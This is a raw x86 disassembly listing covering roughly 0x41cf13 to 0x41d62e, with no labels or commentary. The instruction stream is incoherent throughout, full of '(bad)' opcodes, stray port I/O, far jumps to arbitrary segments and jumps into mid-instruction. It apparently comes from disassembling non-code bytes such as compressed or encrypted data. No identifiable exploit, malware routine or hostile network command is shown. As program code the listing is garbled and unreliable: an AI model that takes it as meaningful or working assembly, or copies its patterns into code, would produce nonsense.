  41cf13:	les    esp,FWORD PTR [ebp-0x4f]
  41cf16:	xchg   ebx,eax
  41cf17:	cld    
  41cf18:	mov    dl,0x76
  41cf1a:	mov    edi,0x3ac60153
  41cf20:	jge    0x41cf82
  41cf22:	jbe    0x41cec0
  41cf24:	jge    0x41cf3f
  41cf26:	or     al,0x75
  41cf28:	pop    esp
  41cf29:	jmp    0xba67332f
  41cf2e:	sti    
  41cf2f:	fidiv  WORD PTR [ecx-0x74]
  41cf32:	and    al,0x5a
  41cf34:	cdq    
  41cf35:	ret    
  41cf36:	and    BYTE PTR [eax],ch
  41cf38:	push   0x9842bca2
  41cf3d:	add    DWORD PTR [ebx-0x210a44aa],0xffffffdc
  41cf44:	(bad)  
  41cf45:	xor    eax,0x8a4eecd8
  41cf4a:	popf   
  41cf4b:	std    
  41cf4c:	mov    esi,0x6836fec9
  41cf51:	sub    al,0x62
  41cf53:	scas   eax,DWORD PTR es:[edi]
  41cf54:	xchg   ebp,eax
  41cf55:	shr    DWORD PTR [ecx-0x3db266b7],0x9b
  41cf5c:	inc    edx
  41cf5d:	inc    edx
  41cf5e:	test   bl,0x7d
  41cf61:	(bad)  
  41cf62:	dec    ebp
  41cf63:	pop    eax
  41cf64:	(bad)  
  41cf66:	pop    esp
  41cf67:	and    ebx,ebp
  41cf69:	pop    ecx
  41cf6a:	push   ecx
  41cf6b:	jmp    FWORD PTR [esi]
  41cf6d:	pop    eax
  41cf6e:	push   ebp
  41cf6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cf70:	retf   
  41cf71:	in     eax,dx
  41cf72:	test   eax,0x52f3937b
  41cf77:	dec    esi
  41cf78:	retf   0x2d8
  41cf7b:	mov    DWORD PTR [edi+0x57],edi
  41cf7e:	sar    DWORD PTR ds:0x545b0e88,0xb5
  41cf85:	jbe    0x41cf81
  41cf87:	into   
  41cf88:	daa    
  41cf89:	and    BYTE PTR [ecx+eiz*8-0x88fb775],cl
  41cf90:	jmp    0xb2f0:0xfe6ade90
  41cf97:	add    edi,DWORD PTR [esi-0x77]
  41cf9a:	fisub  DWORD PTR [edx]
  41cf9c:	add    ecx,esi
  41cf9e:	retf   0xc1d3
  41cfa1:	arpl   WORD PTR [ebx+edi*4-0x26],bp
  41cfa5:	mov    ecx,0xc091228a
  41cfaa:	pop    edi
  41cfab:	jae    0x41cf81
  41cfad:	into   
  41cfae:	daa    
  41cfaf:	cwde   
  41cfb0:	out    0xbf,al
  41cfb2:	stos   DWORD PTR es:[edi],eax
  41cfb3:	cmc    
  41cfb4:	jl     0x41cfdd
  41cfb6:	xchg   ebp,eax
  41cfb7:	add    al,0xda
  41cfb9:	aaa    
  41cfba:	(bad)  
  41cfbc:	cwde   
  41cfbd:	(bad)  
  41cfbe:	jp     0x41cfab
  41cfc0:	ss xchg ch,al
  41cfc3:	add    DWORD PTR [ecx+0x42],0xffffffd2
  41cfc7:	(bad)  
  41cfc8:	sahf   
  41cfc9:	dec    esi
  41cfca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cfcb:	adc    al,0xa1
  41cfcd:	jne    0x41d04d
  41cfcf:	out    dx,al
  41cfd0:	pop    edx
  41cfd1:	mov    dl,BYTE PTR [eax+0x16]
  41cfd4:	repnz mov edx,0xf5240192
  41cfda:	inc    edx
  41cfdb:	inc    esi
  41cfdc:	in     al,dx
  41cfdd:	daa    
  41cfde:	pop    ecx
  41cfdf:	pop    edx
  41cfe0:	push   esp
  41cfe1:	push   ecx
  41cfe2:	xchg   ebx,eax
  41cfe3:	add    bh,BYTE PTR [esi-0x4e3661e6]
  41cfe9:	addr16 gs repz dec ecx
  41cfed:	jmp    0x41cfe5
  41cfef:	sub    edx,DWORD PTR [edi]
  41cff1:	jns    0x41cffc
  41cff3:	dec    ebx
  41cff4:	fucomi st,st(6)
  41cff6:	push   ebp
  41cff7:	mov    ebx,edi
  41cff9:	pushf  
  41cffa:	fistp  WORD PTR [ecx-0x7a]
  41cffd:	outs   dx,DWORD PTR ds:[esi]
  41cffe:	cmp    BYTE PTR [edi+0x60],0x52
  41d002:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d004:	mov    dl,0x1e
  41d006:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d007:	outs   dx,BYTE PTR ds:[esi]
  41d008:	(bad)  
  41d009:	nop
  41d00a:	jl     0x41d05a
  41d00c:	jl     0x41d052
  41d00e:	aas    
  41d00f:	jle    0x6771280
  41d015:	mov    gs,WORD PTR [edi]
  41d017:	push   ss
  41d018:	jmp    0xb631c5ec
  41d01d:	pop    ebx
  41d01e:	add    eax,0x2531a136
  41d023:	aaa    
  41d024:	call   0x9006cf03
  41d029:	or     DWORD PTR [edi-0x7c],esp
  41d02c:	pop    ebx
  41d02d:	mov    bh,0xec
  41d02f:	lahf   
  41d030:	mov    ecx,0xff963af3
  41d035:	repnz add dh,al
  41d038:	push   0xa10f9ff1
  41d03d:	int    0xaf
  41d03f:	into   
  41d040:	jecxz  0x41d093
  41d042:	jle    0x41d098
  41d044:	pop    ebx
  41d045:	sub    esp,DWORD PTR [ebx+eax*4]
  41d048:	or     ebp,DWORD PTR [ebp+0x7]
  41d04b:	push   edi
  41d04c:	mov    esi,0xf39e6d5c
  41d051:	xor    al,0x2a
  41d053:	rep lods al,BYTE PTR ds:[esi]
  41d055:	dec    ebx
  41d056:	js     0x41d09c
  41d058:	mov    ah,0x19
  41d05a:	jo     0x41d021
  41d05c:	sahf   
  41d05d:	(bad)  
  41d05e:	mov    al,0xf2
  41d060:	pop    edi
  41d061:	lods   al,BYTE PTR gs:[esi]
  41d063:	(bad)  
  41d064:	aaa    
  41d065:	mov    eax,0x883f8a75
  41d06a:	push   ss
  41d06b:	lds    ecx,FWORD PTR [ebx]
  41d06d:	test   al,0xa7
  41d06f:	xchg   esp,eax
  41d070:	inc    dx
  41d072:	loopne 0x41d0e9
  41d074:	ins    DWORD PTR es:[edi],dx
  41d075:	inc    ebp
  41d076:	in     eax,dx
  41d077:	mov    DWORD PTR cs:[ebx+0x6c],ecx
  41d07b:	pop    ss
  41d07c:	mov    ds:0x1fa68e54,al
  41d081:	cs jp  0x41d0fc
  41d084:	or     al,0xf7
  41d086:	out    0x3f,eax
  41d088:	push   ecx
  41d089:	nop
  41d08a:	pusha  
  41d08b:	pop    ebx
  41d08c:	stos   BYTE PTR es:[edi],al
  41d08d:	daa    
  41d08e:	xchg   esp,eax
  41d08f:	cli    
  41d090:	call   0xb2df:0x4a7f8912
  41d097:	pandn  mm6,QWORD PTR [ecx]
  41d09a:	daa    
  41d09b:	and    edi,DWORD PTR [eax+ebp*1+0x17]
  41d09f:	sub    eax,0x31bd6e5c
  41d0a4:	loopne 0x41d065
  41d0a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d0a7:	popa   
  41d0a8:	xchg   ebx,eax
  41d0a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d0aa:	inc    ebx
  41d0ab:	mov    ds:0x44408f5d,al
  41d0b0:	outs   dx,BYTE PTR ds:[esi]
  41d0b1:	jge    0x41d035
  41d0b3:	in     eax,0x9d
  41d0b5:	lock rcr BYTE PTR [edx+edx*1-0x397e6298],1
  41d0bd:	sub    ch,BYTE PTR [edi]
  41d0bf:	mov    ds:0x159ef4e4,eax
  41d0c4:	inc    esi
  41d0c5:	int    0xc6
  41d0c7:	mov    bl,0xd3
  41d0c9:	jl     0x41d098
  41d0cb:	and    DWORD PTR [edi+0x78e50b49],eax
  41d0d1:	jge    0x41d0e8
  41d0d3:	je     0x41d0c5
  41d0d5:	(bad)  
  41d0d6:	xchg   edx,eax
  41d0d7:	repnz inc esi
  41d0d9:	and    al,0x6c
  41d0db:	(bad)  
  41d0dc:	xchg   esi,eax
  41d0dd:	and    bh,al
  41d0df:	int3   
  41d0e0:	(bad)  
  41d0e1:	je     0x41d0a3
  41d0e3:	and    BYTE PTR [eax],bh
  41d0e5:	xchg   esi,eax
  41d0e6:	(bad)  
  41d0e7:	iret   
  41d0e8:	add    edi,DWORD PTR [ebx-0x76417308]
  41d0ee:	xchg   edx,eax
  41d0ef:	(bad)
  41d0f2:	inc    esp
  41d0f3:	cwde   
  41d0f4:	add    al,0x9d
  41d0f6:	mov    edx,0xc611b2e2
  41d0fb:	mov    eax,0x312d704d
  41d100:	data16 sti 
  41d102:	mov    dl,0xa1
  41d104:	sub    bl,BYTE PTR [eax]
  41d106:	xlat   BYTE PTR ds:[ebx]
  41d107:	inc    edi
  41d108:	mov    esi,0xa81ee526
  41d10d:	ffreep st(0)
  41d10f:	jno    0x41d10c
  41d111:	into   
  41d112:	mov    dh,0x93
  41d114:	adc    BYTE PTR [ecx+edx*2],bh
  41d117:	fst    QWORD PTR [ebx-0x1c230069]
  41d11d:	ror    BYTE PTR [eax+0x11e9e0a3],cl
  41d123:	mov    ebx,0x815be3f6
  41d128:	jbe    0x41d0b4
  41d12a:	sub    eax,0xe3fb06b0
  41d12f:	mov    eax,ds:0xc6778c87
  41d134:	mov    bl,0xe6
  41d136:	push   edx
  41d137:	popa   
  41d138:	ja     0x41d167
  41d13a:	push   es
  41d13b:	mov    bh,0x94
  41d13d:	test   al,0x9f
  41d13f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d140:	aaa    
  41d141:	dec    ebx
  41d142:	mov    dh,0x8c
  41d144:	outs   dx,DWORD PTR ds:[esi]
  41d145:	push   edi
  41d146:	mov    ecx,0xde22a8f3
  41d14b:	mov    ecx,0x6a7c375
  41d150:	mov    ds:0xaea96a62,al
  41d155:	cmp    bl,dh
  41d157:	push   ecx
  41d158:	and    DWORD PTR [eax+ecx*1],ebx
  41d15b:	aas    
  41d15c:	out    dx,eax
  41d15d:	ror    BYTE PTR [eax-0x47fc07b6],1
  41d163:	rcl    ecx,0xd9
  41d166:	data16 jno 0x41d18a
  41d169:	pop    esi
  41d16b:	push   esp
  41d16c:	cmp    BYTE PTR [eax-0x15],0x97
  41d170:	mov    dl,0x47
  41d172:	xchg   edx,eax
  41d173:	xchg   ebx,eax
  41d174:	int3   
  41d175:	fmul   DWORD PTR [esi-0x3321b36a]
  41d17b:	call   0x27dc:0x9b93423b
  41d182:	shl    DWORD PTR [esi],1
  41d184:	stos   DWORD PTR es:[edi],eax
  41d185:	pop    ebp
  41d186:	out    0x70,al
  41d188:	xor    al,0x6d
  41d18a:	fdiv   st(1),st
  41d18c:	xlat   BYTE PTR ds:[ebx]
  41d18d:	dec    BYTE PTR [ebx-0x3a0eae45]
  41d193:	stos   DWORD PTR es:[edi],eax
  41d194:	jne    0x41d11a
  41d196:	xchg   DWORD PTR [ebp-0x11e2f0e2],ebp
  41d19c:	mov    esi,0x61a9b4b3
  41d1a1:	jbe    0x41d21d
  41d1a3:	xor    ebp,DWORD PTR [ebp+esi*1+0x4e]
  41d1a7:	dec    edx
  41d1a8:	mov    eax,ds:0xda2e6636
  41d1ad:	mov    ebx,esp
  41d1af:	mov    ah,0xf9
  41d1b1:	sub    eax,0xa81b197c
  41d1b6:	mov    bl,0x26
  41d1b8:	jnp    0x41d15d
  41d1ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d1bb:	test   DWORD PTR [esi],0x2e729c7b
  41d1c1:	pusha  
  41d1c2:	push   edi
  41d1c3:	pop    ebx
  41d1c4:	sub    BYTE PTR [eax+0x78],0xde
  41d1c8:	cmp    BYTE PTR [eax+ebp*8+0x3f],bh
  41d1cc:	adc    dl,BYTE PTR [ebx]
  41d1ce:	pop    es
  41d1cf:	stos   DWORD PTR es:[edi],eax
  41d1d0:	or     DWORD PTR [ebx],eax
  41d1d2:	nop
  41d1d3:	int3   
  41d1d4:	jecxz  0x41d18e
  41d1d6:	mov    BYTE PTR [ebx+esi*4-0x13],0x16
  41d1db:	and    ch,dl
  41d1dd:	loop   0x41d226
  41d1df:	hlt    
  41d1e0:	int3   
  41d1e1:	stc    
  41d1e2:	popf   
  41d1e3:	inc    esi
  41d1e4:	or     DWORD PTR [ecx],edx
  41d1e6:	push   edi
  41d1e7:	pop    esi
  41d1e8:	mov    ds:0xd5d18d77,al
  41d1ed:	popa   
  41d1ee:	pop    eax
  41d1ef:	loopne 0x41d183
  41d1f1:	rcr    esi,1
  41d1f3:	or     bh,BYTE PTR [ecx]
  41d1f5:	ins    DWORD PTR es:[edi],dx
  41d1f6:	pop    eax
  41d1f7:	imul   edx,DWORD PTR [esi+ecx*4+0x3e],0x8445f389
  41d1ff:	scas   eax,DWORD PTR es:[edi]
  41d200:	sbb    DWORD PTR [ebp+ebx*2+0x511ade6c],edi
  41d207:	dec    ecx
  41d208:	xor    BYTE PTR [eax-0x66196ae5],dl
  41d20e:	adc    BYTE PTR [ecx+0x4584887a],0xf5
  41d215:	push   ds
  41d216:	push   ebp
  41d217:	add    eax,0x5c089e22
  41d21c:	inc    esp
  41d21d:	xlat   BYTE PTR ds:[ebx]
  41d21e:	push   eax
  41d21f:	neg    BYTE PTR [esi]
  41d221:	dec    edi
  41d222:	int    0xf8
  41d224:	cmp    eax,0xe7394052
  41d229:	jo     0x41d261
  41d22b:	xchg   edx,eax
  41d22c:	mov    edx,0xd90c6252
  41d231:	inc    eax
  41d232:	in     al,dx
  41d233:	mov    bl,0xef
  41d235:	push   ecx
  41d236:	retf   0x96b5
  41d239:	push   ebx
  41d23a:	mov    dl,0x4a
  41d23c:	in     al,0x3b
  41d23e:	(bad)  
  41d23f:	rcr    BYTE PTR [edx+0x6e1f329],1
  41d245:	sahf   
  41d246:	push   esi
  41d247:	imul   ebp,DWORD PTR [ebx+0x15],0x5
  41d24b:	cwde   
  41d24c:	sub    bh,cl
  41d24e:	pusha  
  41d24f:	cdq    
  41d250:	dec    ebp
  41d251:	jecxz  0x41d1d3
  41d253:	shl    cl,0xed
  41d256:	xchg   esp,eax
  41d257:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d258:	jne    0x41d233
  41d25a:	mov    ecx,0xcef2a272
  41d25f:	(bad)  
  41d260:	cwde   
  41d261:	in     eax,dx
  41d262:	popa   
  41d263:	loop   0x41d1fa
  41d265:	and    ah,BYTE PTR [ecx]
  41d267:	add    DWORD PTR [edx+esi*2-0x10eb205e],esp
  41d26e:	lods   al,BYTE PTR ds:[esi]
  41d26f:	clc    
  41d270:	aaa    
  41d271:	fldcw  WORD PTR ds:0xc95ce580
  41d277:	daa    
  41d278:	movaps xmm1,XMMWORD PTR [esp+eiz*4]
  41d27c:	jecxz  0x41d208
  41d27e:	fisttp DWORD PTR [edi+0x993cb54]
  41d284:	pop    edx
  41d285:	lods   al,BYTE PTR ds:[esi]
  41d286:	in     al,dx
  41d287:	inc    edi
  41d288:	inc    ebp
  41d289:	out    0x3e,al
  41d28b:	or     dh,BYTE PTR [esp+esi*1+0x4c]
  41d28f:	adc    eax,DWORD PTR [esi-0xb]
  41d292:	inc    eax
  41d293:	popf   
  41d294:	mov    al,ds:0x137e0e65
  41d299:	and    eax,0xce805eeb
  41d29e:	lods   eax,DWORD PTR ds:[esi]
  41d29f:	jle    0x41d303
  41d2a1:	ror    BYTE PTR [edi-0x2e],1
  41d2a4:	addr16 aad 0xd
  41d2a7:	aad    0x4e
  41d2a9:	cmp    DWORD PTR ds:0x4bf3252d,ebp
  41d2af:	iret   
  41d2b0:	(bad)  
  41d2b1:	push   eax
  41d2b2:	leave  
  41d2b3:	sub    BYTE PTR [ebx],bh
  41d2b5:	xchg   esp,eax
  41d2b6:	pop    edi
  41d2b7:	data16 sbb BYTE PTR [ecx+0x34],dh
  41d2bb:	mov    BYTE PTR [edx+0x42a14f6d],ah
  41d2c1:	and    ah,dh
  41d2c3:	ja     0x41d2ef
  41d2c5:	(bad)  
  41d2c6:	and    eax,DWORD PTR [ebp+ecx*8-0x39ac176a]
  41d2cd:	rol    BYTE PTR [edx+0x1100d55b],cl
  41d2d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d2d4:	mov    dh,0x45
  41d2d6:	mov    dh,0x26
  41d2d8:	stos   BYTE PTR es:[edi],al
  41d2d9:	mov    ebp,esp
  41d2db:	aas    
  41d2dc:	imul   ebx,DWORD PTR [esi+0x6193cf98],0x5e
  41d2e3:	pop    esi
  41d2e4:	mov    ds:0x150cdda9,eax
  41d2e9:	sub    al,0xae
  41d2eb:	in     al,0xb3
  41d2ed:	fsubr  DWORD PTR [ebx+0x2]
  41d2f0:	int    0x2a
  41d2f2:	pop    esi
  41d2f3:	or     dh,cl
  41d2f5:	rcr    esp,0x8a
  41d2f8:	sub    DWORD PTR [ebp-0x5fed519e],eax
  41d2fe:	scas   eax,DWORD PTR es:[edi]
  41d2ff:	or     al,0x4d
  41d301:	mov    ds:0x5fd00ee4,eax
  41d306:	push   edx
  41d307:	call   0xe2fe:0x54528e9c
  41d30e:	or     ebx,DWORD PTR [esi-0x346e41e5]
  41d314:	iret   
  41d315:	pop    eax
  41d316:	jge    0x41d29d
  41d318:	(bad)  
  41d319:	pop    ss
  41d31a:	jnp    0x41d320
  41d31c:	dec    edi
  41d31d:	cs adc al,0x2
  41d320:	push   esp
  41d321:	jns    0x41d388
  41d323:	out    dx,eax
  41d324:	ficomp DWORD PTR [ecx+0x2c943a69]
  41d32a:	imul   esi,DWORD PTR [esi-0x3b9f65eb],0x850fd368
  41d334:	aam    0xd5
  41d336:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d337:	xor    bh,ah
  41d339:	sub    al,0x85
  41d33b:	outs   dx,BYTE PTR ds:[esi]
  41d33c:	int3   
  41d33d:	inc    ebx
  41d33e:	add    esi,0xffffffe3
  41d341:	sbb    ebx,DWORD PTR [edi]
  41d343:	rcl    DWORD PTR [edi-0x47],0x7d
  41d347:	inc    ebx
  41d348:	mov    ch,cl
  41d34a:	pushf  
  41d34b:	stc    
  41d34c:	icebp  
  41d34d:	sbb    ebp,DWORD PTR [esi]
  41d34f:	or     ch,ch
  41d351:	cld    
  41d352:	pop    edi
  41d353:	xchg   ebp,eax
  41d354:	(bad)  
  41d355:	popa   
  41d356:	inc    esi
  41d357:	pop    ecx
  41d358:	cdq    
  41d359:	inc    edi
  41d35a:	aas    
  41d35b:	cmp    bl,0xf9
  41d35e:	push   eax
  41d35f:	ja     0x41d350
  41d361:	or     dl,0xe8
  41d364:	jo     0x41d359
  41d366:	adc    edi,DWORD PTR [esi-0x21]
  41d369:	push   edi
  41d36a:	pop    edx
  41d36b:	jecxz  0x41d391
  41d36d:	push   ebx
  41d36e:	jmp    0x9b5b:0x11490c42
  41d375:	repz or cl,cl
  41d378:	push   esi
  41d379:	xchg   DWORD PTR [esi],ebx
  41d37b:	jb     0x41d32f
  41d37d:	pop    eax
  41d37e:	jmp    esp
  41d380:	sub    edi,edx
  41d382:	sub    ecx,DWORD PTR [ebx]
  41d384:	xor    BYTE PTR [edx+0xdb809ae],dl
  41d38a:	mov    bh,0xb1
  41d38c:	(bad)  
  41d38d:	jmp    0x79a5:0x1b4638fc
  41d394:	ss or  eax,0x83bd1e88
  41d39a:	sub    al,0xfd
  41d39c:	sub    esp,ecx
  41d39e:	push   0x1d
  41d3a0:	mov    bh,0xe5
  41d3a2:	cmp    DWORD PTR [ebp+ebp*2+0x3554d3],ebp
  41d3a9:	or     eax,0xbad67232
  41d3ae:	and    edx,esi
  41d3b0:	imul   edx,DWORD PTR [esi+eax*4-0x635f2873],0xfffffff4
  41d3b8:	(bad)  
  41d3b9:	out    0x8b,eax
  41d3bb:	add    edi,edx
  41d3bd:	leave  
  41d3be:	pushf  
  41d3bf:	adc    BYTE PTR [ecx+0x17],al
  41d3c2:	xchg   esp,eax
  41d3c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d3c4:	popf   
  41d3c5:	inc    ecx
  41d3c6:	ss (bad) 
  41d3c8:	mov    ebx,0xd769dc17
  41d3cd:	shr    DWORD PTR [ebp-0x4b],cl
  41d3d0:	jbe    0x41d43d
  41d3d2:	mov    eax,0xf21c91d7
  41d3d7:	ins    BYTE PTR es:[edi],dx
  41d3d8:	push   ebp
  41d3d9:	or     bh,bl
  41d3db:	ss inc esp
  41d3dd:	xchg   sp,ax
  41d3df:	fstp   QWORD PTR [edi+eax*2]
  41d3e2:	mov    ebp,0xfad33c3c
  41d3e7:	sub    eax,esp
  41d3e9:	fbstp  TBYTE PTR [ebx+0x264776a]
  41d3ef:	mov    dl,0xd0
  41d3f1:	imul   ebp,ebp,0x6085bc83
  41d3f7:	push   edx
  41d3f8:	sbb    DWORD PTR [ebx-0x76c9e7e9],esp
  41d3fe:	mov    dl,0x1b
  41d400:	inc    edx
  41d401:	test   DWORD PTR [eax+0x21],eax
  41d404:	and    al,0xbc
  41d406:	xchg   DWORD PTR [ebp-0xe6d814b],ecx
  41d40c:	popf   
  41d40d:	push   ss
  41d40e:	cmp    BYTE PTR [edx+0x55],ah
  41d411:	and    al,0xcd
  41d413:	stc    
  41d414:	pop    edx
  41d415:	adc    al,0xe1
  41d417:	sbb    BYTE PTR [ebx+0x1],0xff
  41d41b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d41c:	pop    ebp
  41d41d:	adc    eax,DWORD PTR [edi+0x244f00f]
  41d423:	jecxz  0x41d40d
  41d425:	mov    esp,0xc2304671
  41d42a:	in     eax,dx
  41d42b:	jle    0x41d404
  41d42d:	sahf   
  41d42e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d42f:	xchg   BYTE PTR [ebx],bh
  41d431:	push   esp
  41d432:	test   edx,ecx
  41d434:	sub    eax,0xb85b5353
  41d439:	and    esp,DWORD PTR [ecx*2-0xb5abfa2]
  41d440:	bswap  ecx
  41d442:	fild   DWORD PTR [eax+0x455c425]
  41d448:	sbb    DWORD PTR [edx+0x31],esi
  41d44b:	in     eax,0x34
  41d44d:	push   esp
  41d44e:	adc    BYTE PTR [esi-0x6e],ch
  41d451:	test   al,0x29
  41d453:	sub    ah,BYTE PTR [edx]
  41d455:	sub    BYTE PTR [ecx],dl
  41d457:	and    cl,BYTE PTR [ecx]
  41d459:	les    eax,FWORD PTR ds:[ecx+0x7d75c1aa]
  41d460:	bound  edi,QWORD PTR [edx-0x3d2ebaa6]
  41d466:	jae    0x41d49a
  41d468:	add    DWORD PTR [esi+0x2],ebx
  41d46b:	xchg   ecx,eax
  41d46c:	mov    al,0x84
  41d46e:	int3   
  41d46f:	add    eax,0x28e9d152
  41d474:	lods   al,BYTE PTR ds:[esi]
  41d475:	popa   
  41d476:	out    0xae,al
  41d478:	add    dl,ah
  41d47a:	daa    
  41d47b:	in     al,dx
  41d47c:	mov    esp,edi
  41d47e:	ds xchg ebx,eax
  41d480:	and    al,0x63
  41d482:	sbb    cl,BYTE PTR [eax]
  41d484:	std    
  41d485:	or     esi,DWORD PTR [ebx-0x1]
  41d488:	add    al,0xc6
  41d48a:	loope  0x41d486
  41d48c:	add    eax,0x790ce90c
  41d491:	cli    
  41d492:	push   edi
  41d493:	(bad)  
  41d494:	sti    
  41d495:	cmp    ecx,DWORD PTR [esi-0x5d96f546]
  41d49b:	fmul   DWORD PTR [edx]
  41d49d:	and    DWORD PTR [edx+0x64b695fa],esi
  41d4a3:	or     eax,0x59876ef2
  41d4a8:	mov    eax,0x31fd2df2
  41d4ad:	mov    cl,BYTE PTR [eax]
  41d4af:	stc    
  41d4b0:	ins    BYTE PTR es:[edi],dx
  41d4b1:	mov    bh,0x0
  41d4b3:	sti    
  41d4b4:	inc    ebx
  41d4b5:	xchg   edi,eax
  41d4b6:	rol    BYTE PTR [eax],cl
  41d4b8:	jb     0x41d43f
  41d4ba:	add    DWORD PTR [ecx+0x3d],edx
  41d4bd:	retf   0x80d6
  41d4c0:	adc    DWORD PTR [esi],ebx
  41d4c2:	dec    eax
  41d4c3:	jge    0x41d52e
  41d4c5:	dec    ebp
  41d4c6:	xchg   ebp,eax
  41d4c7:	call   0x76bc:0x80a4aca6
  41d4ce:	mov    dl,0xc5
  41d4d0:	mov    al,ds:0xc588ff25
  41d4d5:	mov    ch,0x0
  41d4d7:	add    dh,cl
  41d4d9:	sbb    BYTE PTR [eax],al
  41d4db:	pop    ss
  41d4dc:	popa   
  41d4dd:	(bad)  
  41d4de:	pop    ss
  41d4df:	add    edx,edx
  41d4e1:	pop    DWORD PTR [ecx+0x5c2f551a]
  41d4e7:	in     al,0xc7
  41d4e9:	pop    es
  41d4ea:	test   DWORD PTR [eax+0x5cfb1e3f],ebp
  41d4f0:	adc    ebx,DWORD PTR [ebx-0x46]
  41d4f3:	fst    DWORD PTR [edi-0x3d]
  41d4f6:	inc    edx
  41d4f7:	add    bl,BYTE PTR [esi]
  41d4f9:	jae    0x41d515
  41d4fb:	mov    BYTE PTR [ecx],ah
  41d4fd:	test   eax,0xe383c29c
  41d502:	inc    ecx
  41d503:	cmp    al,0xb1
  41d505:	test   edi,esi
  41d507:	js     0x41d4f0
  41d509:	inc    ebp
  41d50a:	(bad)  
  41d50b:	ja     0x41d550
  41d50d:	inc    edx
  41d50e:	push   ds
  41d50f:	pop    ds
  41d510:	pusha  
  41d511:	je     0x41d4fb
  41d513:	fs ss mov ebx,0x4bb49011
  41d51a:	sub    BYTE PTR ds:0x926efe8a,dh
  41d520:	mov    cl,0x2c
  41d522:	pop    esi
  41d523:	sub    DWORD PTR [ebp-0x5609acf1],0xffffffc6
  41d52a:	xchg   ecx,eax
  41d52b:	lahf   
  41d52c:	adc    dl,BYTE PTR [esi]
  41d52e:	push   esi
  41d52f:	xchg   esp,eax
  41d530:	pushf  
  41d531:	les    ebp,FWORD PTR [ecx+edi*4]
  41d534:	jge    0x41d54a
  41d536:	cmp    eax,ecx
  41d538:	adc    BYTE PTR [edx+ebp*8-0x3a],bh
  41d53c:	rcr    esp,cl
  41d53e:	xor    al,0x2c
  41d540:	ficomp DWORD PTR [edx]
  41d542:	in     eax,dx
  41d543:	fisub  DWORD PTR [ebx]
  41d545:	pushf  
  41d546:	sub    BYTE PTR [ebp+eax*1-0x7a],0xb7
  41d54b:	or     ecx,DWORD PTR [esi-0x66]
  41d54e:	rol    BYTE PTR [esi],1
  41d550:	cdq    
  41d551:	mov    edx,0x5a3884b4
  41d556:	lahf   
  41d557:	push   ebx
  41d558:	outs   dx,DWORD PTR ds:[esi]
  41d559:	or     DWORD PTR [ebx],esi
  41d55b:	sub    al,0x8d
  41d55d:	and    edx,DWORD PTR [ebx+edx*2+0x42e16a32]
  41d564:	add    BYTE PTR [edx-0x7cc8d1e],dl
  41d56a:	daa    
  41d56b:	cmp    DWORD PTR [ebp+0x4f29bcf0],ebx
  41d571:	imul   ebx,ebx,0xffffffdc
  41d574:	sahf   
  41d575:	aad    0x26
  41d577:	adc    DWORD PTR [edi+0x15],ebp
  41d57a:	fcmovb st,st(4)
  41d57c:	in     eax,0xee
  41d57e:	pop    eax
  41d57f:	xor    al,0xa0
  41d581:	out    0x6d,al
  41d583:	fsub   DWORD PTR [esi-0x7cdffce]
  41d589:	rcl    BYTE PTR [eax+esi*2-0x10942720],cl
  41d590:	bswap  ebx
  41d592:	packuswb mm3,QWORD PTR [ebx+edx*4]
  41d596:	pop    ecx
  41d597:	and    bl,BYTE PTR [esp+ebp*4-0x23421404]
  41d59e:	aam    0x36
  41d5a0:	cmc    
  41d5a1:	(bad)  
  41d5a2:	xor    al,0x8b
  41d5a4:	mov    esi,0xd3c0235d
  41d5a9:	jno    0x41d582
  41d5ab:	loop   0x41d5b8
  41d5ad:	jmp    0x7b55:0x786df045
  41d5b4:	sar    BYTE PTR [ecx],1
  41d5b6:	neg    DWORD PTR [esi-0x73df5a5e]
  41d5bc:	cmc    
  41d5bd:	retf   0xe9d4
  41d5c0:	and    bh,bh
  41d5c2:	sub    eax,0x3b4b8d8
  41d5c7:	push   ecx
  41d5c8:	xchg   ecx,eax
  41d5c9:	(bad)  
  41d5ca:	(bad)  
  41d5cb:	fs push ds
  41d5cd:	pop    esi
  41d5ce:	inc    edx
  41d5cf:	imul   esp,DWORD PTR [edi+0x34087c6e],0xe6df561f
  41d5d9:	popa   
  41d5da:	xor    BYTE PTR [ebp-0x27bead1a],0x51
  41d5e1:	std    
  41d5e2:	test   DWORD PTR [eax+0x49],edi
  41d5e5:	test   BYTE PTR [ebp+eax*2+0x76],bh
  41d5e9:	jp     0x41d581
  41d5eb:	and    bl,ah
  41d5ed:	push   ebx
  41d5ee:	inc    esi
  41d5ef:	aas    
  41d5f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d5f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d5f2:	sub    dh,BYTE PTR [edi+0x791e69b9]
  41d5f8:	mov    ch,0x88
  41d5fa:	repnz retf 0x7b67
  41d5fe:	jno    0x41d59e
  41d600:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d601:	jnp    0x41d5de
  41d603:	lods   eax,DWORD PTR ds:[esi]
  41d604:	push   cs
  41d605:	dec    esi
  41d606:	les    edi,FWORD PTR [ebx]
  41d608:	fidivr WORD PTR [esp+ebp*2]
  41d60b:	sbb    dl,bh
  41d60d:	sahf   
  41d60e:	outs   dx,DWORD PTR ds:[esi]
  41d60f:	jmp    0x41d5ce
  41d611:	push   0xe26dd2b0
  41d616:	fsubr  DWORD PTR [esi+0x27]
  41d619:	icebp  
  41d61a:	mov    esi,0x9a986ef1
  41d61f:	jb     0x41d640
  41d621:	mov    al,ds:0x2aa84a72
  41d626:	stos   DWORD PTR es:[edi],eax
  41d627:	call   0xd3ff4649
  41d62c:	xchg   ch,dl
  41d62e:	mov    al,0xa5
